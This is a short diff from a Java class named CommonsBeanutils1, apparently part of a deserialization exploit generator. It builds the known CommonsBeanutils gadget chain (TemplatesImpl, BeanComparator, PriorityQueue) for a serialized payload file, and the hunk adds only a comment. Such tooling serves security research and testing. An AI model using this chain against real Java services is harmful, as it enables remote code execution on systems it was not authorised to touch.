@@ -9,6 +9,7 @@ public class CommonsBeanutils1 {
     public static String fileName = "CommonsBeanutils1.bin";
     public static void main(String[] args) throws Exception {
         TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+        //Collections.reverseOrder()
         final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add("1");
